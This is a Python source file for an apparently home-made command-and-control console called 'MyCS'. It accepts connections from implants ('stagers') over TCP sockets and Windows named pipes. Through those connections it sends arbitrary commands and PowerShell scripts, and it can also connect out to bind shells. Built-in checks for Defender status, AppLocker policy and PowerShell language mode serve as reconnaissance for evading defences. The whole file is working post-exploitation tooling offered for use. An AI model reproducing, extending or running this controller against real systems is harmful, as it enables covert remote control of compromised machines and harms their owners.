import socket
import struct
import threading
import queue
import uuid 
import os
import time

import win32pipe, win32file, pywintypes

#from os.path import isfile, join

import readline
readline.parse_and_bind("tab: complete")

class VolcabCompleter:
    def __init__(self,volcab):
        self.volcab = volcab

    def complete(self,text,state):
        results =  [x for x in self.volcab if x.startswith(text)] + [None]
        return results[state]

def setautocomplete(words):
    completer = VolcabCompleter(words)
    readline.set_completer(completer.complete)

def removecomplete():
    readline.set_completer()

class myconstant():
    def __init__(self):

        self.TAG_MYCS = "[MYCS]"
        self.TAG_LISTENER = "[Listener]"
        #self.TAG_STAGER = "[Stager]"
        self.TAG_INTE_STAGER = "[Interact]"
        self.TAG_PIPE_LISTENER = "[Pipe Listener]"
        self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"


        self.CMD_USELISTENER = "uselistener"
        #self.CMD_USESTAGER = "userstager"
        self.CMD_INTERACTSTAGER = "stager"
        self.CMD_PIPE_INTERACTSTAGER = "pstager"
        self.CMD_USEPIPELISTENER = "usepipelistener"
        self.CMD_HELP = "help"
        self.CMD_EXIT = "exit"
        self.CMD_AUTOLIST = [self.CMD_USEPIPELISTENER,self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT,self.CMD_PIPE_INTERACTSTAGER]

        self.CMD_BACK = "back"
        self.CMD_LISTENER_GETINFO = "info"
        self.CMD_LISTENER_SETHOSTNAME = "sethost"
        self.CMD_LISTENER_SETPORT = "setport"
        self.CMD_LISTENER_START = "start"
        self.CMD_LISTENER_LIST = "list"
        self.CMD_LISTENER_STOP = "stop"
        self.CMD_LISTENER_AUTOLIST = [self.CMD_BACK,self.CMD_LISTENER_GETINFO,self.CMD_LISTENER_SETHOSTNAME,
                                    self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]

        self.CMD_STAGER_GET_LIST = "list"
        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_STAGER_GET_INTO = "into"
        self.CMD_STAGER_GET_HISTORY = "history"
        self.CMD_STAGER_LOAD_PS = "psload"
        self.CMD_STAGER_CON = "connect"
        #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
                                    self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON]

        self.CMD_PIPE_LISTENER_GETINFO = "info"
        self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
        self.CMD_PIPE_LISTENER_START = "start"
        self.CMD_PIPE_LISTENER_LIST = "list"
        self.CMD_PIPE_LISTENER_STOP = "stop"
        self.CMD_PIPE_LISTENER_AUTOLIST = [self.CMD_PIPE_LISTENER_GETINFO,self.CMD_PIPE_LISTENER_SETPIPENAME,self.CMD_PIPE_LISTENER_START,
                                            self.CMD_PIPE_LISTENER_LIST,self.CMD_PIPE_LISTENER_STOP,self.CMD_BACK]
        
        self.CMD_PIPE_STAGER_GET_LIST = "list"
        self.CMD_PIPE_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_PIPE_STAGER_GET_INTO = "into"
        self.CMD_PIPE_STAGER_GET_HISTORY = "history"
        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,self.CMD_BACK,self.CMD_PIPE_STAGER_GET_RUNNING_LIST]
        #self.CMD_PIPE_STAGER_LOAD_PS = "psload"
        #self.CMD_PIPE_STAGER_CON = "connect" 


class myconstant_networking(): #applicaiton layer tag
    def __init__(self):
        self.PSRUN_SUCCESS = "PSRUN_SUCCESS"


class mybuildin_cmd():
    def __init__(self):
        self.IF64BIT = "[Environment]::Is64BitProcess"
        self.GETNETVERSION = "get-childitem -path \"HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\""
        self.GETDEFENDER = "Get-MpComputerStatus"
        self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
        self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"


class ps_loader():
    def __init__(self):
        self.DBPATH = "PSDB\\"
        self.psfiles = [f for f in os.listdir(self.DBPATH) if os.path.isfile(os.path.join(self.DBPATH, f))]

    def load_ps(self,filename):
        if filename not in self.psfiles:
            print("No available ...")
            return

        with open(self.DBPATH + filename,mode='r') as f:
            all_of_it = f.read()
            return all_of_it



# socket is assume connected
class mypipe_handler():
    def __init__(self,mypipe):
        self.__mypipe = mypipe
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"

    def msf_encode(self,msg):
        return msg #no encode for now ...
        #return self.__msg_tag_st + msg + self.__msg_tag_ed


    def get_nextmsg(self):
        while True:
            try:
                resp = win32file.ReadFile(self.__mypipe, 1024)
                break
            except Exception as e:
                if e.args[0] == 232:
                    pass
                else:
                    raise e
        return resp[1].decode("ascii", "ignore")


# socket is assume connected
class mysocket_handler():
    def __init__(self,in_socket):
        self.__mysocket = in_socket
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"
        self.__mysocket.settimeout(5)

    def msf_encode(self,msg):
        return self.__msg_tag_st + msg + self.__msg_tag_ed


    def get_nextmsg(self):

        while True:
            # if msg buf is enough
            if self.__msg_tag_st in self.__msg_buf and self.__msg_tag_ed in self.__msg_buf:
                #get start tag
                t_startmsg = self.__msg_buf.find(self.__msg_tag_st)
                t_endmsg = self.__msg_buf.find(self.__msg_tag_ed)
                # msg is from startmsg + len(tag) to endmsg
                r_msg = self.__msg_buf[(t_startmsg + len(self.__msg_tag_st)):t_endmsg]
                #print("[DEBUG] r_msg: {}".format(r_msg))
                # remove sub string from buf + return
                self.__msg_buf = self.__msg_buf[(t_endmsg + len(self.__msg_tag_ed)):]
                return r_msg
            else:
                # get more message
                try: 
                    t_indata = self.__mysocket.recv(1024)
                    self.__msg_buf = self.__msg_buf + t_indata.decode("ascii", "ignore")
                except socket.timeout:
                    pass

                


class myserver():

    def __init__(self):
        self.__mysocket_list = dict()
        self.__mydata_list = dict() #Que to runner
        self.__myaddr_list = dict() #this is port + ip
        self.__mymsg_list = dict()
        self.__myuuid_list = list()
        self.__mystart_list = dict() #bool

        self.__mylistener_start_list = dict() #bool
        self.__mylistener_hostname_list = dict()
        self.__mylistener_port_list = dict()
        self.__mylistener_socket_list = dict()
        self.__mylistener_uuid_list = list()

        self.__hostname = "192.168.182.131"
        self.__port = 4444

        self.__pipename = "namedpipeshell"

        self.__mypipelistener_start_list = dict() #bool
        self.__mypipelistener_pipename_list = dict()
        self.__mypipelistener_pipe_list = dict()
        self.__mypipelistener_uuid_list = list()
        
        self.__mypipe_myhandle_list = dict()
        self.__mypipe_mydata_list = dict() #Que to runner
        self.__mypipe_mypipename_list = dict()
        self.__mypipe_mymsg_list = dict()
        self.__mypipe_myuuid_list = list()
        self.__mypipe_mystart_list = dict() #bool


    def start_worker(self,myuuid):
        t_net_constant = myconstant_networking()
        print("[Stager] This is the worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mydata_list[myuuid]
            mysocket = self.__mysocket_list[myuuid]
            myhistory = self.__mymsg_list[myuuid]
            # make a handler class
            t_mysockethandler = mysocket_handler(mysocket)
            

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                if (cmd_struct_to_send[0] == "psload"):
                    cmd_struct_to_send[0] = "ps"
                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
                else:
                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                
                encode_tag = t_mysockethandler.msf_encode(cmd_struct_to_send[0]).encode("ascii", "ignore")
                send_result = mysocket.send(encode_tag)
                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_tag), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = t_mysockethandler.msf_encode(cmd_struct_to_send[1]).encode("ascii", "ignore")
                send_result = mysocket.send(encode_cmd)
                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                # try get cmd result if any
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_mysockethandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("ascii", "ignore")
                send_result = mysocket.send(encode_cmd)
                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                myhistory.append("Exception: " + str(e))
                mysocket.shutdown(socket.SHUT_RDWR)
                mysocket.close()
                #remove from worker list
                self.__mydata_list.pop(myuuid, None)
                self.__mysocket_list.pop(myuuid, None)
                self.__myaddr_list.pop(myuuid, None)
                self.__mystart_list[myuuid] = False
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break

    def start_pipworker(self,myuuid):
        t_net_constant = myconstant_networking()
        print("[Stager] This is the pipe worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mypipe_mydata_list[myuuid]
            mypipe = self.__mypipe_myhandle_list[myuuid]
            myhistory = self.__mypipe_mymsg_list[myuuid]

            t_mypipehandler = mypipe_handler(mypipe)

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                if (cmd_struct_to_send[0] == "psload"):
                    cmd_struct_to_send[0] = "ps"
                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
                else:
                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                
                encode_tag = t_mypipehandler.msf_encode(cmd_struct_to_send[0]).encode("ascii", "ignore")
                win32file.WriteFile(mypipe, encode_tag)
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = t_mypipehandler.msf_encode(cmd_struct_to_send[1]).encode("ascii", "ignore")
                win32file.WriteFile(mypipe, encode_cmd)
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                # try get cmd result if any
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_mypipehandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("ascii", "ignore")
                win32file.WriteFile(mypipe, encode_cmd)
                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                print("Exception: " + str(e))
                myhistory.append("Exception: " + str(e))
                #remove from worker list
                self.__mypipe_mydata_list.pop(myuuid, None)
                self.__mypipe_mypipename_list.pop(myuuid, None)
                self.__mypipe_mystart_list[myuuid] = False
                win32file.CloseHandle(self.__mypipe_myhandle_list[myuuid])
                self.__mypipe_myhandle_list.pop(myuuid, None)
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break

    
    def start_client(self,conhost,conport):
        print("Trying to connect to Host: {} and Port: {}".format(conhost,conport))
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((conhost,conport))
        except Exception as e:
            print("Error connecting to client: {}...".format(str(e)))
            return
        
        #get uuid and normal setup
        print("[Client] Connected to", conhost)
        #get uuid
        myuuid = uuid.uuid4().hex[:6].upper()
        #push socket into dict
        self.__mysocket_list[myuuid] = client
        #push addr into dict
        self.__myaddr_list[myuuid] = (conhost,conport) #may or may not the same format 
        #create fifo
        self.__mydata_list[myuuid] = queue.Queue()
        #create history
        self.__mymsg_list[myuuid] = list()
        #push uuid
        self.__myuuid_list.append(myuuid)
        #set start
        self.__mystart_list[myuuid] = True
        print("[Client] myuuid is {}".format(myuuid))
        threading.Thread(target=self.start_worker,args=(myuuid,)).start()


    def start_listener(self):
        print("Starting listener on Hostname: {} and Port: {}".format(self.__hostname,self.__port))
        #get uuid
        listeneruuid = uuid.uuid4().hex[:6].upper()
        self.__mylistener_start_list[listeneruuid] = True
        self.__mylistener_hostname_list[listeneruuid] = self.__hostname
        self.__mylistener_port_list[listeneruuid] = self.__port
        self.__mylistener_uuid_list.append(listeneruuid)

        self.__mylistener_socket_list[listeneruuid] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.__mylistener_socket_list[listeneruuid].bind((self.__hostname, self.__port))
        self.__mylistener_socket_list[listeneruuid].settimeout(5)
        self.__mylistener_socket_list[listeneruuid].listen()
        
        while self.__mylistener_start_list[listeneruuid]:
            try:
                #print("[DEBUG] Waiting for new connection ...")
                conn, addr = self.__mylistener_socket_list[listeneruuid].accept()
                print("[Listener] Connected by", addr)
                #get uuid
                myuuid = uuid.uuid4().hex[:6].upper()
                #push socket into dict
                self.__mysocket_list[myuuid] = conn
                #push addr into dict
                self.__myaddr_list[myuuid] = addr
                #create fifo
                self.__mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mymsg_list[myuuid] = list()
                #push uuid
                self.__myuuid_list.append(myuuid)
                #set start
                self.__mystart_list[myuuid] = True
                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                
            except socket.timeout:
                pass
        
        # our of while loop
        self.__mylistener_socket_list[listeneruuid].close()
        self.__mylistener_start_list.pop(listeneruuid, None)
        self.__mylistener_hostname_list.pop(listeneruuid, None)
        self.__mylistener_port_list.pop(listeneruuid, None)
        self.__mylistener_socket_list.pop(listeneruuid, None)
        self.__mylistener_uuid_list.remove(listeneruuid)
        print("[Listener] {} is stoped ...".format(listeneruuid))


    def start_pipe_listener(self):
        print("[Listener] pipe server started on namepipe {}".format(self.__pipename))
        mypipeuuid = uuid.uuid4().hex[:6].upper() #listener
        pipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__pipename, win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
        self.__mypipelistener_pipe_list[mypipeuuid] = pipe
        self.__mypipelistener_pipename_list[mypipeuuid] = self.__pipename
        self.__mypipelistener_uuid_list.append(mypipeuuid)
        self.__mypipelistener_start_list[mypipeuuid] = True
        
        #print("[Listener] waiting for client")
        while self.__mypipelistener_start_list[mypipeuuid]:
            
            try:
                win32pipe.ConnectNamedPipe(self.__mypipelistener_pipe_list[mypipeuuid], None)
                print("[Listener] got client")

                myuuid = uuid.uuid4().hex[:6].upper() #stager
                #create fifo
                self.__mypipe_mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mypipe_mymsg_list[myuuid] = list()
                #push uuid
                self.__mypipe_myuuid_list.append(myuuid)
                #set start
                self.__mypipe_mystart_list[myuuid] = True
                #pipe name
                self.__mypipe_mypipename_list[myuuid] =self.__mypipelistener_pipename_list[mypipeuuid]
                #push pipe handle
                self.__mypipe_myhandle_list[myuuid] = self.__mypipelistener_pipe_list[mypipeuuid]
                
                
                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
                
                while (self.__mypipe_mystart_list[myuuid]):
                    time.sleep(5)
                
                #renew handle
                newpipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__mypipelistener_pipename_list[mypipeuuid], win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
                self.__mypipelistener_pipe_list[mypipeuuid] = newpipe
                
            except Exception as e:
                if (e.args[0] == 536): #notstarted or busy
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                elif (e.args[0] == 231):
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                else:
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                time.sleep(5)

        #end of while loop
        #dummy for now
        win32file.CloseHandle(pipe)
        


    def create_command(self,stager,tag,command):
        self.__mydata_list[stager].put([tag,command])
    
    def create_pipe_command(self,stager,tag,command):
        self.__mypipe_mydata_list[stager].put([tag,command])
    
    def stop_listener(self,listener):
        self.__mylistener_start_list[listener] = False

    def print_info(self):
        print("++++++++++++++++++++++++Listener Info++++++++++++++++++++++++")
        print("Listener Type: socket")
        print("Hostname: {}".format(self.__hostname))
        print("Port Number: {}".format(self.__port))
    
    def print_pipe_info(self):
        print("+++++++++++++++++++++Pipe Listener Info++++++++++++++++++++++")
        print("Listener Type: pipe")
        print("Pipe Name: {}".format(self.__pipename))

    
    def print_stager(self):
        print("List of avaliable stager: {}".format(self.__myuuid_list))
    
    def print_pipe_stager(self):
        print("List of avaliable pipe stager: {}".format(self.__mypipe_myuuid_list))

    
    def print_listener(self):
        print("List of avaliable listener: {}".format(self.__mylistener_uuid_list))

    def get_stager(self):
        return self.__myuuid_list
    
    def get_pipe_stager(self):
        return self.__mypipe_myuuid_list

    def get_running_stager(self):
        return [a for a in self.__myuuid_list if self.__mystart_list[a]]
    def get_running_pipe_stager(self):
        return [a for a in self.__mypipe_myuuid_list if self.__mypipe_mystart_list[a]]

    def get_listener(self):
        return self.__mylistener_uuid_list

    def print_stager_running(self):
        print("List of running pipe stager: {}".format(self.get_running_stager()))
    def print_pipe_stager_running(self):
        print("List of running pipe stager: {}".format(self.get_running_pipe_stager()))

    def get_history(self):
        return self.__mymsg_list
    
    def get_pipe_history(self):
        return self.__mypipe_mymsg_list

    def set_hostname(self,hostname):
        assert(type(hostname) is str)
        self.__hostname = hostname

    def set_portnumber(self,port):
        assert(type(port) is int)
        self.__port = port
    
    def set_pipename(self,pipename):
        assert(type(pipename) is str)
        self.__pipename = pipename


class mymainclass():

    def __init__(self):
        self.__t_myconstant = myconstant()
        self.__t_myserver = myserver()

    def __cmd_list_main(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_USELISTENER + ": Go to listener settings")
        print(self.__t_myconstant.CMD_USEPIPELISTENER + ": Go to pipe listener setting")
        print(self.__t_myconstant.CMD_PIPE_INTERACTSTAGER + ": Interact with pipe stager")
        print(self.__t_myconstant.CMD_INTERACTSTAGER + ": Interact with live stager")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_EXIT + ": Exit the app")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_listener(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_LISTENER_GETINFO + ": Print info of current listener setting")
        print(self.__t_myconstant.CMD_LISTENER_SETHOSTNAME + ": Set hostname")
        print(self.__t_myconstant.CMD_LISTENER_SETPORT + ": Set port number")
        print(self.__t_myconstant.CMD_LISTENER_LIST + ": Get a list of running listener")
        print(self.__t_myconstant.CMD_LISTENER_START + ": Start Listener using info")
        print(self.__t_myconstant.CMD_LISTENER_STOP + ": Stop a listener")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_BACK + ": Go back to main menu")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_stager(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
        print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
        print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
        print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
        print("+++++++++++++++++++++++++++++++++++\n")


    def main(self):
        
        #init
        cmd_tag = self.__t_myconstant.TAG_MYCS

        print("Hello To MyCS ...")
        
        self.__cmd_list_main()
        

        to_exit = False
        while (not to_exit):

            if cmd_tag == self.__t_myconstant.TAG_MYCS:
                setautocomplete(self.__t_myconstant.CMD_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_LISTENER:
                setautocomplete(self.__t_myconstant.CMD_LISTENER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:
                setautocomplete(self.__t_myconstant.CMD_STAGER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                setautocomplete(self.__t_myconstant.CMD_PIPE_LISTENER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
                setautocomplete(self.__t_myconstant.CMD_PIPE_SAGER_AUTOLIST)
            

            user_input = input(cmd_tag + "> ")
            command_id = user_input
            
            if cmd_tag == self.__t_myconstant.TAG_MYCS: #Main menu
                
                # menu switch
                if command_id == self.__t_myconstant.CMD_USELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_LISTENER
                    continue

                if command_id == self.__t_myconstant.CMD_USEPIPELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_PIPE_LISTENER
                    continue

                if command_id == self.__t_myconstant.CMD_PIPE_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_PIPE_INTE_STAGER
                    continue
                
                if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
                    continue
                
                # main menu
                if command_id == self.__t_myconstant.CMD_EXIT:
                    print("Thanks for using MyCS..")
                    exit()
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_main()
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_LISTENER: # Listener menu

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                # listener menu
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_listener()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_GETINFO:
                    self.__t_myserver.print_info()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETHOSTNAME:
                    user_input = input("Please enter the hostname to listen on: ")
                    self.__t_myserver.set_hostname(user_input)
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETPORT:
                    user_input = input("Please enter the port number to listen on: ")
                    self.__t_myserver.set_portnumber(int(user_input))
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_LIST:
                    self.__t_myserver.print_listener()
                
                if command_id == self.__t_myconstant.CMD_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_LISTENER_STOP:
                    #set auto compete to listener uuid
                    setautocomplete(self.__t_myserver.get_listener())

                    user_input_listener = input("Please enter the listener uuid: ")
                    if user_input_listener not in self.__t_myserver.get_listener():
                        print("Please input a valid listener uuid")
                        continue
                    self.__t_myserver.stop_listener(user_input_listener)
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_stager()
                    continue

                # stager inte menu
                if command_id == self.__t_myconstant.CMD_STAGER_GET_LIST:
                    self.__t_myserver.print_stager()
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_stager_running()
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
                        print(each_msg)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_LOAD_PS:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue

                    t_psloader = ps_loader()
                    #set auto compete for filename
                    setautocomplete(t_psloader.psfiles)
                    user_input_psfile = input("Please enter psfile to load: ")
                    t_result = t_psloader.load_ps(user_input_psfile)
                    #call psrun with tag psload
                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)

                if command_id == self.__t_myconstant.CMD_STAGER_CON:
                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_host = input("Please enter hostname or ip: ")
                    user_input_port = input("Please enter portnumber: ")
                    self.__t_myserver.start_client(user_input_host,int(user_input_port))
            #next cmd

            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_GETINFO:
                    self.__t_myserver.print_pipe_info()
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_pipe_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_SETPIPENAME:
                    removecomplete()
                    user_input_pipename = input("Please enter the pipename: ")
                    self.__t_myserver.set_pipename(user_input_pipename)

            
            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
                #menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_LIST:
                    self.__t_myserver.print_pipe_stager()
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_INTO:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_pipe_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_pipe_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    self.__t_myserver.create_pipe_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_pipe_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_pipe_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_pipe_history()[user_input_stager]:
                        print(each_msg)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_pipe_stager_running()
                    continue




if __name__ == "__main__":

    t_mymainclass = mymainclass()
    t_mymainclass.main()


